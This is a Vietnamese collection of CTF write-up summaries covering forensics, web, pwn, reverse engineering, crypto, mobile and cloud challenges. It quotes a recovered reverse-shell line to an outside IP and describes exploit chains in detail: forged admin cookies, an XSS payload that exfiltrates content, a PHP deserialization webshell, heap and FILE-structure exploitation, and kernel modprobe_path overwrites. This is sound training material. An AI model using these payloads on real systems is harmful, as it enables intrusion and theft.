---
title: Skill 
description: Skill 
date: 2026-01-01 00:00:00+0000
image: image.png
categories:
    - CTF
tags:
    - SKILL
weight: 25
---


# MENU 

## FOR 

```text

Khi gặp bài Windows Registry Forensics tương tự, trước hết hãy kiểm kê artefact và tính SHA-256 để bảo toàn bằng chứng, sau đó xác định hive người dùng liên quan (NTUSER.DAT) bằng cách tìm các nhánh ứng dụng đáng ngờ; luôn replay NTUSER.DAT.LOG1/LOG2 vào một bản sao bằng công cụ như regipy để khôi phục thay đổi chưa commit rồi so sánh với hive gốc. Tiếp theo, phân tích các key lịch sử của ứng dụng—với 7-Zip là Software\7-Zip\Extraction, Compression và FM—đồng thời kiểm tra artefact bổ trợ như Explorer\TypedPaths, RecentDocs và ComDlg32. Đừng bỏ qua REG_BINARY: hãy trích và decode chuỗi UTF-16LE để đọc PathHistory, FolderHistory, CopyHistory và ArcHistory; dùng FolderHistory để xác định các thư mục đã enumerate, CopyHistory để tìm nơi staging, ArcHistory cùng Archiver để xác định archive đầu ra, và PanelPath0 kết hợp mục MRU mới nhất để tìm thư mục kết thúc. Cuối cùng, dựng timeline từ Registry LastWrite time, chỉ gán timestamp khi artefact thực sự cung cấp, đối chiếu mỗi kết luận qua ít nhất hai nguồn nếu có thể, và khi submit hãy ưu tiên raw value nguyên bản—đúng full path, extension và dấu \—thay vì câu trả lời rút gọn theo cách diễn đạt của đề.

== 

Giải nén ZIP rồi TAR.GZ, phân tích UAC bằng cách đọc wtmp/wtmp.db để thấy phiên SSH từ 10.10.0.56 của kingmaelor, đối chiếu /etc/passwd (UID 1005, GID 1011) với /etc/group để suy ra kingmaelor:crownspire, sau đó kiểm tra ps, pstree, /proc/*/cmdline, netstat, bodyfile.txt và danh sách hash executable để xác định tiến trình độc hại /srv/AshShare/linux_sys_updater; nhận diện binary là PyInstaller, trích xuất code object client, dùng Python marshal.loads() và dis.dis() để đọc bytecode, thấy master secret ZQLJlA8BYg0iy1qFH0PwpB8tn8Y2DX0j, hàm KDF tạo AES key bằng SHA256(SHA256(master).digest()+b'encryption').digest()[:32], thu được key hex 9df1f3bd6110a9684f0b921d6fc79779e9f0d1896615b05bd10b1995121c0c0b rồi tính MD5 trên raw bytes thành 6ffc06ff97ec037753feda5354b650b3; đảo hàm làm rối chuỗi bằng Base64 decode rồi XOR 0x55 và 0xAA để tìm prefix ASH_CLI_, lệnh upload UPLD_FILE và các token giao thức, đồng thời đọc opcode STORE_FAST ngay sau subprocess.check_output() để xác định biến chứa output là Kd3uD9; tự parse PCAP Ethernet/IPv4/TCP, gom TCP stream 10.10.0.10:49892 ↔ 10.10.0.56:443 theo sequence number, tách từng frame bằng độ dài uint32 big-endian, Base64-decode payload thành IV(16)|ciphertext|tag(32), xác minh tag bằng SHA256(hmac_key+IV+ciphertext), giải mã AES-256-CBC và bỏ PKCS#7 padding để dựng transcript theo thời gian, từ đó thấy lệnh thứ hai là ls -la /etc, file tải xuống thứ hai là /etc/hosts, lệnh tạo persistence user chứa credentials backup_usr:9cq3jPVN6Me1; cuối cùng Base64-decode rồi Gzip-decompress payload của lệnh cuối để lộ script ghi bash -i >& /dev/tcp/141.101.64.3/53 0>&1 vào /home/kingmaelor/.local/share/.systemd-helper, qua đó hoàn thành đủ 11 flag.

==

Quy trình tái dùng: kiểm kê artefact/ZIP nhưng không chạy mẫu, export Procmon PML sang CSV rồi lọc Load Image, đường dẫn DLL lạ và Process Create để dựng cây parent PID → child PID/cmdline; đối chiếu timestamp DNS/HTTP trong PCAP với Procmon để xác định timezone rồi đổi mốc load đầu tiên sang Unix epoch; đọc command line `rundll32 ...DLL,Export` và dùng pefile, unpack UPX hoặc phân tích in-memory để lấy export, imports, strings, mutex và hành vi; lọc RegQueryValue quanh thời điểm nhiễm để tìm REG_BINARY 16 byte, ghi hex đúng thứ tự registry; map API thu thập sang ATT&CK, ví dụ OpenClipboard/GetClipboardData = T1115; parse PCAP, reassemble TCP/HTTP, lấy IP đích thật thay vì tin Host giả, tách body từng POST và thử RC4 với key raw rồi đảo thứ tự byte hoặc các biến thể cần thiết đến khi plaintext hợp lệ, đồng thời kiểm tra mọi payload vì có thể có lore/URL mồi trước payload chứa seed phrase; cuối cùng chép đáp án đúng hoa-thường, dấu `\`, hex và khoảng trắng.

==

Quy trình: dùng 7z l/x kiểm tra archive để lấy capture.pcap và dump, lập inventory/reassemble TCP bằng Wireshark/tshark hoặc dpkt để tách luồng RDP và C2; quét dump tìm log PSDetour chứa CLIENT_RANDOM/MASTER_SECRET, áp dụng TLS-PRF key expansion rồi giải mã TLS 1.2 AES-256-CBC và kiểm tra HMAC/padding, đọc RDP Client Info UTF-16 để lấy password CoffeeMonring@; tìm chuỗi UTF-16/clipboard trong RDP plaintext để khôi phục PowerShell đã paste, thấy __EventFilter và CommandLineEventConsumer cùng Name='SystemOptimize'; giải mã luồng C2 (TLS rồi Base64/XOR theo implant), đối chiếu task inject payload klg.bin và chạy md5sum để có f77d42ed3d0bd6888cb85d742ba8ef19; cuối cùng carve/giải nén CloudSyncer, lấy cấu hình OAuth để liệt kê attacker storage, đối chiếu file JUMP01_error.dmp.zip với createdTime=2026-01-31T08:46:38.613Z thành Unix 1769849198, rồi 7z l archive CFO để lấy tên file bên trong VCS-Internal-Report.pdf.
```

## WEB

```text
Phân tích source cho thấy backend chỉ kiểm tra giá trị cookie `session` và không bắt buộc chữ ký khi nhận, nên có thể giả mạo `session=admin` để vượt đăng nhập, gọi `/api/gate/enter` đổi trạng thái thành `inside`, rồi gọi `/api/flag` lấy flag bằng lệnh: `curl --noproxy "*" -s -X POST -H "Cookie: session=admin" -H "Content-Type: application/json" --data "{}" http://154.57.164.80:32484/api/gate/enter; curl --noproxy "*" -s -X POST -H "Cookie: session=inside" -H "Content-Type: application/json" --data "{}" http://154.57.164.80:32484/api/flag`

==

Massagold bị khai thác bằng chuỗi Stored XSS kết hợp CSP bypass kiểu JSONP: trường content của thư được lưu nguyên dạng và trong message.ejs hiển thị bằng <%- message.content %> nên không được HTML-escape, cho phép chèn thẻ ; khi người chơi gửi thư tới username admin, messageController.js gọi enqueueMessageVisit() và bot Playwright đăng nhập bằng tài khoản admin rồi mở thư, khiến payload chạy trong origin ứng dụng với cookie phiên admin; CSP chặn inline JavaScript nhưng cho phép script từ https://www.googleapis.com, vì vậy dùng endpoint https://www.googleapis.com/oauth2/v3/certs?callback=..., URL-encode toàn bộ JavaScript và kết thúc bằng dấu ; để phần callback lỗi của Google vẫn thực thi mã; payload dùng function thay vì arrow function vì Google escape ký tự > thành \u003e, sau đó gọi fetch('/messages/1') bằng quyền admin để lấy HTML thư chứa flag, rồi gọi fetch('/messages',{method:'POST',headers:{'Content-Type':'application/x-www-form-urlencoded'},body:new URLSearchParams({to_username:'ATTACKER_USERNAME',content:t})}) để gửi nội dung về inbox attacker; cuối cùng đợi bot xử lý, mở thư mới do admin gửi và tìm chuỗi HTB{...}.

== 

Endpoint /administrator/index.php?option=com_provision&view=dispatch&task=ledger.import xử lý request mà không kiểm tra quyền đăng nhập; tham số ledger được đưa thẳng vào @unserialize() trong GatehouseRepository, tạo lỗ hổng PHP Object Injection; record giả dùng GuzzleHttp\Psr7\BufferStream cho trường month, vượt qua phép ép kiểu (string); gadget FormattedtextLogger được cấu hình để ghi file PHP /var/www/html/tmp/guest0.php, chứa shell_exec("/readflag"); gadget User::__wakeup() thay đổi reference defer từ false thành true, destructor của logger sau đó ghi webshell; truy cập /tmp/guest0.php để thực thi /readflag và lấy flag.

===

Phân tích source phát hiện `/report` gọi Puppeteer bot kèm JWT cookie tới `http://127.0.0.1:1337`, dùng trang XSS công khai chạy JavaScript tạo form POST CSRF vào loopback, gửi tới `/api/fetch` để bot SSRF tải archive do mình kiểm soát, khai thác chuỗi `download@8.0.0` → `decompress@4.2.1` bằng tar hardlink ánh xạ `db.json` tới `/app/data/db.json` rồi dùng entry trùng tên ghi đè database, chèn user `master` có `role: ledgermaster`, `verified: true` và bcrypt password tự chọn để đăng nhập lấy JWT admin, tiếp tục dùng hardlink tar ghi đè `/app/public/theme.js` bằng Less plugin JavaScript độc hại, gửi `@plugin "public/theme.js";` tới `/ledgermaster/render` để Less load plugin và thực thi `/readflag` qua `child_process.execFileSync`, ghi kết quả vào `/app/public/convoy-proof.txt` rồi truy cập file static để lấy flag.
 

=== 

```


## FOR

```text
Kỹ thuật thực hiện: mở trang challenge và tải bundle JavaScript của frontend Vite, tìm hai IOC 43E91C và VLR602, sau đó cross-reference dữ liệu trong bundle để xác định Aircraft Registry ghi Mode-S 43E91C tương ứng registration 2-RUNE, owner là Black Keep Leasing SPC và operator thật là Vaultrune Air Services Ltd; Movement Ledger ghi callsign VLR602, registration 2-RUNE, khởi hành từ Suncourt Field (SCF) và đỗ tại stand 4B ở Crownspire; Courier Mail tiếp tục xác nhận record mặt đất sử dụng registration 2-RUNE và stand 4B; gửi bốn đáp án vào Oath API `/api/check` và cả bốn đều trả về `correct: true`, rồi ghép flag theo định dạng registration + departure aerodrome + parking stand; one-liner PowerShell để xác thực Oath: `$a='2-RUNE','Vaultrune Air Services Ltd','Suncourt Field','4B';0..3|%{$b=@{question=$_;answer=$a[$_]}|ConvertTo-Json -Compress;Invoke-RestMethod 'http://154.57.164.78:30444/api/check' -Method Post -ContentType 'application/json' -Body $b}`.

== 

Cách làm: mở trang challenge và lấy file JavaScript Vite trong thẻ `<script src="/assets/...js">`, tìm các IOC `ASHEN MERCY`, `9724418` và `PI-VAL-88291`, sau đó đối chiếu record để xác định Registry IMO 9724418 có owner là Thirteenth Tide Shipping Ltd và ISM manager là Morrow Fleet Management SA; P&I PI-VAL-88291 có commercial operator là Eastreach Maritime Coordination PLC và time charterer là Gilded Knife Commodities Ltd; Company Register cho thấy các công ty này cùng thuộc Marrowcairn Strategic Holdings PLC; gửi năm đáp án vào Oath `/api/check` và nhận `all_correct: true`; khi xác thực thành công, giao diện hiện câu “the ink has been divided among five names.”, chuẩn hóa thành chữ hoa và dấu gạch dưới để tạo flag, không dùng `ASHEN_MERCY` hay `COMPANIES` vì đó chỉ là dữ kiện bề mặt; one-liner PowerShell để xác thực rồi in flag: `$a=@{'1'='Thirteenth Tide Shipping Ltd';'2'='Morrow Fleet Management SA';'3'='Eastreach Maritime Coordination PLC';'4'='Gilded Knife Commodities Ltd';'5'='Marrowcairn Strategic Holdings PLC'};$r=Invoke-RestMethod 'http://154.57.164.79:30506/api/check' -Method Post -ContentType 'application/json' -Body (@{answers=$a}|ConvertTo-Json -Compress);if($r.all_correct){'HTB{THE_INK_WAS_DIVIDED_AMONG_FIVE_NAMES}'}`.

== 

Truy cập dịch vụ, tải JavaScript frontend, tìm MMSI 257771420 trong ghi chú, đối chiếu Registry xác định tàu hiện đăng ký là BRINEWALKER với IMO 9384728, rồi tra Harbor Ledger theo seal EC-4418 để xác nhận berth E-06; Oath Submission xác thực cả bốn đáp án, sau đó chuẩn hóa berth theo mẫu flag thành E06 để thu được HTB{BRINEWALKER_9384728_E06}.

```

## PWN

```text
Kỹ thuật: phân tích tĩnh ELF qua symbols/disassembly, phát hiện `read(0, buf[32], 0x60)` gây stack overflow với offset ghi đè RIP là 40 byte, tận dụng No-PIE để thực hiện ret2win bằng gadget `ret` tại `0x40101a` nhằm căn chỉnh stack rồi nhảy vào `bell()` tại `0x40176d` để mở `/bin/sh`, sau đó liệt kê filesystem và đọc `/home/ctf/flag.txt`.

===

Kỹ thuật đã thực hiện: giải nén ZIP, phân tích ELF64 bằng `pyelftools`/`capstone` để xác định PIE và `GNU_STACK RWX`, phát hiện `service_hatch()` cấp buffer 64 byte tại `rbp-0x40` nhưng gọi `read(0, buffer, 0x50)` gây stack overflow 80 byte, đồng thời `printf("%p", buffer)` làm rò địa chỉ stack; tạo payload gồm shellcode x86-64 `execve("/bin//sh")` có tiền tố `endbr64`, pad đủ 64 byte, ghi đè saved RBP 8 byte và saved RIP bằng địa chỉ buffer leak theo little-endian, gửi payload kèm lệnh shell trong cùng một lần `sendall` để `read()` nhận đúng 80 byte còn `/bin/sh` nhận phần còn lại, sau đó dùng `find / -maxdepth 3 -type f -iname "*flag*"` tìm `/home/ctf/flag.txt` và `cat` để lấy flag.

===

Phân tích menu heap để phát hiện UAF: Destroy chỉ xoá cờ active, còn Inspect làm leak và Inscribe vẫn ghi vào chunk đã free; free chunk lớn có guard để leak `main_arena+0x60` từ unsorted bin rồi suy ra libc base; tạo/churn hai chunk tcache cùng size, overwrite `fd` của chunk freed để tcache poisoning tới `__free_hook-8`; cấp phát lại vùng hook, ghi địa chỉ `system` vào `__free_hook`, sau đó free chunk chứa `cat /home/ctf/flag.txt` để thực thi lệnh và lấy flag.

===

1. setbuf(stdin,0) setbuf(stdout,0) puts(banner) printf("Rin's:") scanf("%40s",stdout) printf(prompt2) scanf("%224s",stderr) ret → exit→_IO_flush_all
2. Stage1: gửi p64(0xFBAD1800)+p64(0)*3+b"X" (33B) vào stdout → partial-overwrite _IO_write_base→printf(prompt2) flush ~55KB libc.data → quét _IO_file_jumps (libc+0x202030) tính libc base
3. Stage2: tạo bytearray(0xE0) fake FILE:
   [0x00]="`\x80`;sh\x00" (byte0=\x60 tránh NO_WRITES/UNBUFFERED, byte1=\x80 set USER_LOCK→skip lock)
   [0x08]=p64(0) [0x10]=p64(1) [0x20]=p64(0)                    # wide_data fields alias (wide=stderr-0x10)
   [0x68]=p64(system)                                            # fake_wide_vtable->__doallocate
   [0xA0]=p64(stderr-0x10)                                       # _wide_data
   [0xC0]=p32(1) [0xD0]=p64(stderr) [0xD8]=p64(_IO_wfile_jumps) # mode, wide_vtable, vtable
4. Gửi 224B+f"\n" vào stderr → main return → _IO_flush_all_lockp→_IO_wfile_overflow→_IO_wdoallocbuf→call [stderr+0x68]=system(stderr)→"`\x80`;sh" chạy sh→cat flag 

===

e8d006ffff (CALL rel32 = -0xf930 vào main tạo stack frame 2 với [rbp-0x60]=NULL và rcx=0) → main kiểm tra stage1_used flag → mmap stage 2 tại libc_base - (((getpid()&7)+0x1000)<<12) → gửi e9b5f30e01 (JMP rel32 qua vùng mmap tới gadget libc+0xef3ba) → gadget mov rdi,rsp; lea rdx,[rcx+0xf]; mov rsi,rdx; ... sub rsp,15 dựng argv={"/bin/sh",NULL,NULL} và envp=NULL → call execve thành công vì rcx=0 làm rsp dịch 15 bytes tránh ghi đè argv1.


===

Chuỗi tổng quát là: ALLOC Crown → ALLOC Regalia → BIND →
     BREAK → pipe reclaim/leak → tính kernel base → giải phóng
     pipe → reclaim Crown → IMPRESS ghi pointer → INSCRIBE ghi
     modprobe_path → trigger binfmt → đọc flag

     
```
## RE
```text

Kỹ thuật thực hiện: giải nén `Ringtrue.zip`, phân tích tĩnh ELF không strip bằng `file`, `strings`, `nm/objdump` để xác định chương trình dùng mạng MLP 8→8→8→8 với các mảng `L0_W/L0_B`, `L1_W/L1_B`, `L2_W/L2_B`, đầu ra được so sánh với `ECHO_S`; trích toàn bộ trọng số, bias và hằng số, dựng lại chính xác phép lan truyền thuận rồi giải ngược hệ phương trình để tìm tám đầu vào `83 97 108 116 67 114 119 110`, chuyển sang ASCII thành `SaltCrwn`; sau đó tái tạo khóa `SHA256(b"SaltCrwn" + b"\x00\x00\x00\x00")`, XOR khóa với `VOW_CIPHER` để giải mã lời thề và thu được flag `HTB{h3y_s1gn3t_1_4m_y0ur_k1ng}`.

=== 

Kỹ thuật thực hiện: giải nén `First Mark.zip`, kiểm tra `first-mark.elf` bằng `file`, `readelf`, `strings` và disassembly để xác định ELF32 RISC-V bị strip xử lý 16 byte qua bốn custom instruction, trích các bảng `ROT`, `MUL` và `TARGET` từ `.rodata`, suy luận rune 1 là phép xoay phải 8-bit `ROR8(a0, a1 & 7)`, rune 2 là phép nhân trong trường `GF(2^8)` với đa thức AES `0x11B`, triển khai rune 3 theo gợi ý `out = a0 ^ state ^ carry`, `carry = old_a0 & state`, với `state` ban đầu `0xA5`, `carry=0` và cập nhật `state=out`, xác định rune 4 là phép so sánh với byte mục tiêu, sau đó đảo tuần tự rune 3, nhân với nghịch đảo trong `GF(2^8)` và xoay trái để đảo `ROR8`, thu được chuỗi `cut_f0r_th3_P1NT` và flag `HTB{cut_f0r_th3_P1NT}`.

====

Kỹ thuật thực hiện: giải nén file ZIP và kiểm tra `cinderbound.mpy` bằng hex dump để nhận diện header `4d 06 00 1f`, xác định đây là bytecode MicroPython `.mpy` phiên bản 6 thay vì mã Python hay ELF thông thường, phân tích cấu trúc `.mpy` gồm qstr table, object table, raw-code object và phần bytecode của hàm lồng nhau, trích object tuple 16 byte mục tiêu `(57, 129, 154, 31, 199, 192, 73, 243, 43, 176, 255, 173, 54, 203, 67, 15)`, giải mã prelude và các opcode của hàm `judge(syllable)` để dựng lại logic khởi tạo `state = 0x5A`, duyệt từng ký tự với chỉ số `i`, tính `x = ord(syllable[i]) ^ state ^ ((i * 13) & 0xFF)`, cập nhật `state = (state + ord(syllable[i])) & 0xFF`, đưa `x` vào danh sách rồi so sánh toàn bộ kết quả với tuple mục tiêu, sau đó đảo phép biến đổi tuần tự bằng công thức `char_i = target[i] ^ state ^ ((i * 13) & 0xFF)` và cập nhật lại state sau mỗi byte để khôi phục chuỗi `c1nd3rbound_v0w5`, chạy phép biến đổi thuận để xác nhận tạo đúng toàn bộ 16 byte target và bọc theo định dạng challenge thành flag `HTB{c1nd3rbound_v0w5}`.


```
## CRYPTO 

```text
Ddegree-4 multivariate polynomial hệ GF(2) → vì binary inputs nên x^4=x^2=x → collapse thành linear system → Gaussian elimination GF(2) tìm key → reverse bit order (Sage bits() LSB-first) → SHA256(str(KEY)) → AES-ECB decrypt flag.

===

Tấn công nhóm con bậc thấp (Small Subgroup Attack): Chọn G = P-1 (có bậc 2 trong Z_P^*) để mọi G^s mod P chỉ trả về 1 hoặc P-1, phân biệt rõ ràng bit密钥=1 (oracle trả về giá trị trong tập {1, P-1}) vs bit密钥=0 (oracle trả về giá trị ngẫu nhiên 256-bit), từ đó recover toàn bộ 256-bit key rồi AES-ECB decrypt flag.

===

Kỹ thuật đã thực hiện: giải nén challenge, phân tích phần khóa RSA trong file PEM bị thiếu dữ liệu để xác định modulus (N), public exponent (e) và phần bit đã biết của một prime, dựng đa thức biểu diễn phần prime chưa biết rồi áp dụng Coppersmith kết hợp lattice reduction LLL để tìm nghiệm nhỏ, từ đó khôi phục chính xác hai prime 1024-bit (p,q) và kiểm tra (p \times q=N), tính (\varphi(N)=(p-1)(q-1)), suy ra private exponent (d=e^{-1}\bmod \varphi(N)), tái tạo khóa riêng RSA hoàn chỉnh và dùng khóa này giải mã file `flag.enc` để thu được flag `HTB{r3c0v3r1ng_RSA_k3ys___l1k3___Me0w___me0o00o0o0w___Me0w}`.

===

Kỹ thuật thực hiện: giải nén `The Cinder Engine.zip`, phân tích tĩnh binary `cinder` bằng `file`, `readelf`, `strings` và disassembly để xác định đây là ELF64 PIE AArch64 bị strip chứa máy ảo tự chế, lần theo vòng lặp interpreter và các nhánh xử lý để khôi phục opcode map gồm `HALT`, `MOV`, `LDI`, `XOR`, `AND`, `OR`, `ADD`, `SUB`, `MUL`, `ROL`, `ROR`, `SHL`, `SHR`, `CMP`, `JMP`, `JZ`, `JNZ`, `LOAD`, `STORE`, `CLOAD`, `INPUT`, `OUTPUT`, trích firmware trong `.rodata`, viết emulator để mô phỏng thanh ghi, bộ nhớ, cờ so sánh và luồng nhảy, xác định chương trình yêu cầu đúng 32 byte rồi lưu hai bản input tại `mem[0x00]` và `mem[0x40]`, phân tích chuỗi bytecode để nhận ra cipher SPN tám vòng dạng `state = input XOR round_key[0]`, sau đó lặp `SBOX → biến đổi tuyến tính M trên GF(2) → XOR round key`, trích S-box, chín round key, target và output mask trực tiếp từ firmware, dựng ma trận nhị phân `32×32` từ các lệnh `LOAD/XOR/STORE`, dùng khử Gauss trên `GF(2)` để tính `M⁻¹`, tạo inverse S-box và đảo từng vòng theo thứ tự `state ^= round_key[r]`, `state = M⁻¹ × state`, `state = inverse_sbox[state]`, thu được input hợp lệ `83efaaac9b9a46fbfe0cb665e082127080782320d51c1d134f5bcd157abaf50f`, sau đó mô phỏng nhánh thành công cho thấy VM XOR 26 byte đầu của bản sao input với output mask để giải mã và xuất flag `HTB{c1nd3r_3ng1n3_unw0und}`, đồng thời xác minh lại bằng emulator khi chương trình chạy 13.813 instruction, tiêu thụ đúng 32 byte và in chính xác flag trên.

===

 Lập 210 đơn thức bậc 4 của 7 mẫu, dùng LLL tìm 53 quan hệ ngắn, dựng đường cong hữu tỉ và hai điểm ternary (0,
  \infty), lấy tỉ số hai dạng tiếp xúc cao để khôi phục (x), rồi tính SHA256(str(x)) giải AES-ECB.

=== 

```
## AI 

```text
Kỹ thuật đã thực hiện: giải nén challenge và kiểm kê artefact gồm `model.pt`, `model.py`, `tokenizer.json`, manifest cùng năm petition đã token hóa; đọc kiến trúc TinyGPT trong `model.py`, nạp trọng số an toàn bằng `torch.load(..., weights_only=True)` rồi chạy greedy decoding cho từng petition; đối chiếu token ID đầu ra với tokenizer và phát hiện cơ chế “forked tongue” khi nhiều token ID được biểu diễn theo hai lớp khác nhau—bảng `vocab` ánh xạ chúng thành câu trả lời trung thành, vô hại, trong khi tái dựng token theo thứ tự BPE với công thức `token_id = 256 + vị trí của cặp trong merges` lại lộ các chuỗi Base64 bí mật bị chia qua nhiều phản hồi; trích từ request 01 giá trị cipher `SdHpcTbtoxeWrFXraoaBmY8F43qj+LTJnSz2LbgX8N3m+hQyvhjD3Q==` và từ request 03 giá trị pad `SLx4i4WtUZDb8vu8qpj8juT8p8sUj9D6XBNCmyJfSxQ=`, Base64-decode cả hai, tạo keystream bằng `SHAKE-256(pad).digest(len(cipher))`, XOR từng byte cipher với keystream và thu được flag `HTB{th3_h3r4ld_l13s_but_th3_m3rg35_d0nt}`.

=== 


```

## Mobile

```text
Kỹ thuật giải: giải nén APK Godot C#, trích Overstrike.dll, decompile IL và xác định WorldSeal = Mix(CarriedMark) với Mix là phép biến đổi SplitMix64 khả nghịch; lấy TrueSeal = 0xD9A1BB0CABB52586, đảo các bước XOR-shift và phép nhân modulo 264 để khôi phục CarriedMark = 0xD7CAAD24DD98B676, sau đó tính seed = SHA256(BitConverter.GetBytes(CarriedMark)), sinh keystream từng block bằng SHA256(seed || counter_le32) và XOR với SealedRecord 56 byte để thu được flag.

===

Kỹ thuật thực hiện: giải nén APK Godot, dùng `apktool`, `file`, `strings`, `readelf`, `nm` và disassembly để xác định logic kiểm tra không nằm ở GDScript mà trong native extension `libproofmark.x86_64.so`, lần theo hàm đăng ký Godot NativeClass để tìm `submit(a,b,c,d,proof)` và `reseal`, phân tích điều kiện đầu vào cho thấy bốn tham số đầu phải là `83, 67, 55, 462`, tương ứng 16 byte little-endian `53 00 00 00 43 00 00 00 37 00 00 00 ce 01 00 00`, còn `proof` là certificate 32-bit được biến đổi qua 1.200.000 vòng `F(x)=fmix32(x+0xc2b2ae35)` với chuỗi phép `x ^= x>>16`, `x *= 0x85ebca6b`, `x ^= x>>13`, `x *= 0xc2b2ae35`, `x ^= x>>16`, sau đó trạng thái được dùng làm PRNG lấy byte cao để XOR với ciphertext 28 byte; dựa vào tiền tố flag bắt buộc `HTB{` để suy ra bốn byte keystream đầu, duyệt không gian trạng thái có byte cao phù hợp rồi lọc bằng các vòng PRNG kế tiếp, tính nghịch đảo modular của hai hằng số nhân và đảo các phép XOR-shift để giải ngược `fmix32`, tiếp tục đảo toàn bộ 1.200.000 vòng nhằm thu certificate chính xác `0x71d3a101`, đưa seed này vào thuật toán sinh keystream để giải mã ciphertext và xác nhận flag `HTB{p3rf3ct_f4c3_tru3_sp1n3}`.


===

Kỹ thuật giải: giải nén APK Godot C#, trích và phân tích IL của SaltCrown.dll, xác định Forge() khởi tạo seed FNV 0x811C9DC5, sắp xếp các ShardSeat theo ChokeIndex rồi trộn từng cặp (choke, PhaseBucket) bằng SaltCrownSpec.Mix; reverse native GDExtension libashvault...so để tái tạo admit_bucket() từ ashvault.dat, thu các bucket cho choke 0→7 là [149,84,104,178,26,6,101,234], brute-force các tổ hợp 5 choke và chỉ tổ hợp (3,4,5,6,7) giải mã SealedSpec thành p3rf3ct_f4c3_wr0ng_sp1n3. 

```
## CLOUD

```text
Lấy credentials từ /player-creds.json trên cổng briefing, ký SigV4 gọi ssm:DescribeParameters để liệt kê /ferry/crossing/, dùng
  ssm:GetParameter đọc live-crossing-id rồi CROSSING-7A3F, dùng ARN + ExternalId trong bản ghi để gọi sts:AssumeRole, sau đó ký SigV4
  bằng temporary credentials gọi s3:GetObject với bucket/key/versionId trong manifest và nhận flag
  HTB{ferry_crossing_dock_seal_de2caca740ae1627e300be191f8d1a49}.


=== 

Truy cập :31833/player-creds.json lấy credentials → cấu hình AWS CLI với endpoint :30129 → chạy aws cloudtrail lookup-events --max-
  results 50 và lặp NextToken → sắp xếp CloudTrailEvent theo eventTime, đối chiếu sourceIPAddress/userName để lấy chuỗi
  ListAccessKeys → GetTrailStatus → DeleteTrail (Denied) → ListBucket/ListObjectsV2 → StopLogging.

===

Mở http://154.57.164.81:30370/player-creds.json lấy
  credentials → cấu hình AWS CLI với endpoint
  http://154.57.164.81:30879 → chạy aws cloudtrail lookup-events
  và lặp NextToken → sắp xếp CloudTrailEvent theo eventTime, lọc
  IP 10.41.53.22/198.18.44.91 → đối chiếu chuỗi ListObjectsV2 →
  GetCallerIdentity → GetObject(AccessDenied) → AssumeRole
  auditor(AccessDenied) → AssumeRole scanner → DeleteObject →
  PutObject, rồi dùng aws s3api list-object-versions để xác nhận
  object và version bị thay đổi. 


===


```
